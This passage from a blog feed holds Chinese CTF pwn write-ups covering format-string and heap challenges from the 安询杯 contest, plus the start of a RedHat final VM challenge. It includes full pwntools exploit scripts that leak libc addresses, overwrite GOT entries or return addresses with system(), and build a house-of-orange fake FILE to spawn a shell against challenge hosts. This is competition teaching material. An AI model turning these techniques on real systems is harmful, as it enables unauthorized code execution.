  <span class="built_in">printf</span>(s1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login successfully! Have fun!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现这是个无次数限制的格式化字符串利用。但是这里往bss段上写，不能像上面那样利用。这个时候我们看一下我们利用的时候，栈上的数据</p><p><img src="./7.png" alt></p><p>我们能看到栈上ebp的指针指向上一个ebp。上一个ebp指向上上个ebp。我们前面是不是说过只要有地址，我们就能往这个地址上写任意的值。</p><p>这个时候我们可以这样利用。这里我们为了叙述，我们把当前ebp叫ebp1,我们上一个ebp叫ebp2,我们把上上个ebp叫做ebp3。</p><p>这个时候我们需要转换思维，既然这个有值是栈地址，我们就不需要去修改got表再劫持程序了，我们直接修改老eip。</p><p>我们可以这样利用，我们通过ebp1将ebp2的值，让他指向一个老eip。所以然后就可以利用了。然后通过ebp2去修改老eip的值。最后改为system地址</p><p>我的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./login"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">"./login"</span>)</span><br><span class="line">bss=<span class="number">0x804B0A0</span>+<span class="number">0xc</span>+<span class="number">0x10</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your name: "</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%6$p'</span></span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x080485AF '''</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please input your password: "</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">stack_addr=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%15$p'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_start_main=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">libc=LibcSearcher(<span class="string">"__libc_start_main"</span>,libc_start_main)</span><br><span class="line">system=libc_start_main-libc.dump(<span class="string">"__libc_start_main"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">str_bin_sh=libc_start_main-libc.dump(<span class="string">"__libc_start_main"</span>)+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0xc</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0xc</span>+<span class="number">2</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((system&gt;&gt;<span class="number">16</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0x4</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((str_bin_sh&amp;<span class="number">0xffff</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0x4</span>+<span class="number">2</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((str_bin_sh&gt;&gt;<span class="number">16</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x080485AF '''</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-8</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">p.sendafter(<span class="string">"Try again!\n"</span>,<span class="string">"wllmmllw"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="总结">总结</span></h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近比赛有太多的格式化字符串漏洞，今天就来总结一下常见的格式化字符串。由易到难的讲解格式化字符串的利用和最近遇到格式化字符串的考点。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;漏洞原理分析&quot;&gt;漏洞原理分析&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;格式化字符串一般都是程序员为了偷懒而导致的漏洞
      
    
    </summary>
    
    
      <category term="pwn总结" scheme="http://Whali3n51.top/categories/pwn%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="格式化字符串" scheme="http://Whali3n51.top/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>安询杯pwn_wp</title>
    <link href="http://whali3n51.top/2019/12/01/%E5%AE%89%E8%AF%A2%E6%9D%AFwp_pwn/"/>
    <id>http://whali3n51.top/2019/12/01/%E5%AE%89%E8%AF%A2%E6%9D%AFwp_pwn/</id>
    <published>2019-12-01T05:40:00.000Z</published>
    <updated>2020-03-29T13:51:46.788Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="summary">summary</span></h2><p>简单说一下这个比赛，感觉这个比赛难度还是不错的，刚刚好，侥幸拿到了一个一血。其中有三道盲打pwn，两道格式化字符串的，一道rop的盲打。rop那道是真的没什么思路，还有一道路由器的pwn,我不知道为什么运行不了二进制文件，可能我环境配置的问题吧。</p><h2><span id="0x01-fmt32">0x01 fmt32</span></h2><h3><span id="introduction">introduction</span></h3><p>这一道题通过题目描述，只给了容器，然后看题目名为32位格式化字符串，并没有像往常的pwn题那样给二进制文件。所以这个时候大致猜测为盲打pwn。</p><h3><span id="exploit">exploit</span></h3><p>这道题侥幸拿到了一个一血，顺便总结一下我自己认为的格式化字符串盲打的想法吧。首先就是利用’%p’通过格式化字符串将栈上数据全部打印出来。打印出来，会得到两个信息，一个是我们输入的值是在栈上，另一个是发现有一个text段的地址，这个时候就能得到程序的基址，而且程序没有开启pie。按照一般的思路，这个时候可以用%s将整个程序dump出来。但是我没有这么做，我嫌效率太低。我直接猜测的got表的地址。我为什么这么做呢。因位got表的偏移和text的偏移是固定的，想知道这个偏移，随便打开一个32位程序就知道了，接下来就是不断尝试printf在got表的地址了。然后后面就是格式化字符串的利用了。</p><p>下面是我的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'47.108.135.45'</span>,<span class="number">10001</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">addr=<span class="number">0x804A014</span></span><br><span class="line">payload=<span class="string">'a'</span>+p32(addr)+<span class="string">'%'</span>+<span class="string">'8'</span>+<span class="string">'$s'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'Repeater:a'</span>)</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">"printf"</span>,printf_addr)</span><br><span class="line">system=printf_addr-libc.dump(<span class="string">"printf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>+p32(addr)+p32(addr+<span class="number">2</span>)+<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>)<span class="number">-0x12</span>)+<span class="string">'c%8$hn'</span>+<span class="string">'%'</span>+str((system&gt;&gt;<span class="number">16</span>)-((system&amp;<span class="number">0xffff</span>)<span class="number">-0x12</span>)<span class="number">-18</span>)+<span class="string">'c%9$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">";cat /flag"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x02-fmt64">0x02 fmt64</span></h2><h3><span id="introduction">introduction</span></h3><p>这一道题和上一道题一样，不过这一道题给了一个txt,里面描述如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -s stilltest</span></span><br><span class="line">Symbol table '.dynsym' contains 15 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)</span><br><span class="line">     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.2.5 (2)</span><br><span class="line">     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)</span><br><span class="line">     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.2.5 (2)</span><br><span class="line">     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.2.5 (2)</span><br><span class="line">     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (2)</span><br><span class="line">     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)</span><br><span class="line">     9: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND gmon_start</span><br><span class="line">    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sprintf@GLIBC_2.2.5 (2)</span><br><span class="line">    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (2)</span><br><span class="line">    12: 0000000000601080     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2)</span><br><span class="line">    13: 0000000000601090     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5 (2)</span><br><span class="line">    14: 00000000006010a0     8 OBJECT  GLOBAL DEFAULT   26 stderr@GLIBC_2.2.5 (2)</span><br></pre></td></tr></table></figure><h3><span id="exploit">exploit</span></h3><p>根据这个txt,完全可以算出printf_got表地址。存放stdout的地址为601080，这个地址同时也是bss段的开头地址，bss地址和got表地址相差0x20，这个也是随便打开一个64位程序能得到的偏移。然后也是泄露地址，确定偏移量，然后格式化字符串构造。不过可惜没拿到一血，当时因为有其他事情，晚做了三四个小时。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'47.108.135.45'</span>,<span class="number">20162</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">addr=<span class="number">0x601080</span><span class="number">-0x20</span><span class="number">-0x8</span></span><br><span class="line">payload=<span class="string">'%9$s'</span>.ljust(<span class="number">8</span>,<span class="string">'a'</span>)+p64(addr)</span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'Repeater:'</span>)</span><br><span class="line">printf_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">"sprintf"</span>,printf_addr)</span><br><span class="line">system=printf_addr-libc.dump(<span class="string">"sprintf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line"><span class="comment">#system=0x666666666666</span></span><br><span class="line">printf=<span class="number">0x601080</span><span class="number">-0x20</span><span class="number">-0x38</span><span class="number">-8</span></span><br><span class="line">payload=<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>)<span class="number">-0x9</span>)+<span class="string">'c%12$hn'</span>+<span class="string">'%'</span>+str(((system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-((system&amp;<span class="number">0xffff</span>)<span class="number">-0x9</span>)<span class="number">-0x9</span>)+<span class="string">'c%13$hn'</span></span><br><span class="line">payload+=(<span class="number">32</span>-len(payload))*<span class="string">'a'</span>+p64(printf)+p64(printf+<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">';cat /flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x03-heap">0x03 heap</span></h2><h3><span id="introduction">introduction</span></h3><p>介绍很简单，就是一个堆，给了二进制文件,给了libc2.23。</p><h3><span id="exploit">exploit</span></h3><p>分析它的伪代码，发现有一个off-by-null，并且最开始有一个格式化字符串漏洞。但是限制开辟堆块大小，必须为0x80以上的堆块。然后这一题有两种解法，一种是house of orange,还有一种就是unlink。unlink比较简单。说一下unlink的思路吧，最初泄露出pie，然后就是常规unlink。下面是我用house of orange做的。最初泄露__libc_start_main，然后确定libc基址。然后利用house of orange,造成堆块重叠，最后构造fake_file，然后getshell。</p><p>下面是我的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">p=process(<span class="string">"./pwn1"</span>)</span><br><span class="line"><span class="comment">#p=remote('47.108.135.45',20162)</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,index,content)</span>:</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the index you want to create (0-10):'</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">"Enter a size:\n"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the content: \n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Enter an index:\n"</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Enter an index:\n"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the content: \n'</span>,content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter your name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'%15$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hello, 0x'</span>)</span><br><span class="line">libc_start_main=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-240</span></span><br><span class="line">libc_base=libc_start_main-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">success(<span class="string">"libc_base=====&gt;0x%x"</span>%libc_base)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x18cd57</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xd8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">fake_file+=p64(libc_base+<span class="number">0x3c37a0</span><span class="number">-8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="number">1</span>,<span class="string">'c'</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="number">2</span>,<span class="string">'b'</span>)</span><br><span class="line">create(<span class="number">0x88</span>,<span class="number">3</span>,<span class="string">'c'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x100</span>+p64(<span class="number">0x210</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake_file)</span><br><span class="line">create(<span class="number">0x1e0</span>,<span class="number">4</span>,<span class="string">'cat /flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;summary&quot;&gt;summary&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;简单说一下这个比赛，感觉这个比赛难度还是不错的，刚刚好，侥幸拿到了一个一血。其中有三道盲打pwn，两道格式化字符串的，一道rop的盲打。rop那道是真的没什么思路，还有一道路由器的pwn,我
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="盲打pwn" scheme="http://Whali3n51.top/tags/%E7%9B%B2%E6%89%93pwn/"/>
    
      <category term="格式化字符串" scheme="http://Whali3n51.top/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>ReaHat_final_pwn</title>
    <link href="http://whali3n51.top/2019/11/28/RedHat/"/>
    <id>http://whali3n51.top/2019/11/28/RedHat/</id>
    <published>2019-11-28T15:30:00.000Z</published>
    <updated>2020-12-13T10:45:13.487Z</updated>
    
    <content type="html"><![CDATA[<p>最近做了vm的pwnt题才发现Vm的pwn题是真的有意思，做vm的关键在于逆向，我的逆向太菜了，逆的太慢了，做题速度直接与逆向速度挂钩，导致就做出来一道题，哭了。随便提一句有的没的，广州是真的好，主办方是我见过最良心的主办方，大气+多金。还有一道关于json的pwn,我实在是做不出来，就不写了。</p><h2><span id="0x01粤湾中心">0x01粤湾中心</span></h2><p>这一道题比赛现场没时间做，我的逆向太菜了，当时只看懂了一个大概。赛后也想向其他师傅请教了一下。</p><p>首先拿到这道题看一下开启的保护</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>这一道题不能直接getshell，因为开启了prctl,禁用了execve</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &gt;= <span class="number">0x40000000</span>) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != write) goto <span class="number">0010</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000024</span>  A = count &gt;&gt; <span class="number">32</span> # write(fd, buf, count)</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) goto <span class="number">0010</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000020</span>  A = count # write(fd, buf, count)</span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  <span class="keyword">if</span> (A == <span class="number">0x10</span>) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这一道题最初打flag文件，然后将fd重定位到了0x233这个地方。所以我们解这一道题的主要思路就是将fileno的值改为0x233，然后当程序读取输入的时候，自动去0x233这个地方读取输入，然后再将输入打印出来，刚好本题结尾处就有这样的条件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Could you tell me your name?"</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%99s"</span>, &amp;v0);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Goodbye~ %s\n"</span>, &amp;v0);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"See you next time."</span>);</span><br></pre></td></tr></table></figure><p>所以我们现在只需要将fileno该为0x233就可以了。</p><p>这一题提供了加减乘除等等指令。这个题的漏洞就是在读取寄存器的时候，没有对索引值进行检查，导致了越界读写。因此将栈地址改为fileno的地址，通过入栈操作就可以将该题fileno修改了。不过计算起来贼麻烦，我没有自己算，哈哈哈哈哈哈哈 ，贴一下其他师傅的脚本吧。</p><p>下面脚本是ditto师傅的，他的博客链接：<a href="http://dittozzz.top/" target="_blank" rel="noopener">http://dittozzz.top/</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 